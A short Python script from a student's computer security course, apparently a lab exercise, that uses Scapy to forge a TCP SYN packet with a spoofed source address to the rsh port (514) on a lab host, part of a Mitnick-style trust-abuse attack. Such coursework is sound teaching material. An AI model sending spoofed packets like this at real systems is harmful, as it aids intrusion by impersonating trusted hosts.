#!/user/bin/python3

'''
	Name: Joshua Ludolf
	Class: CSCI 4321 - Computer Security
'''

from scapy.all import *

srv_ip = "10.9.0.6"
x_ip = "10.9.0.5"

ip = IP(src = srv_ip, dst = x_ip)

tcp = TCP(sport = 1023, dport = 514, flags = "S", seq = 778933536)

pkt = ip/tcp

ls(pkt)

send(pkt, verbose = 0)

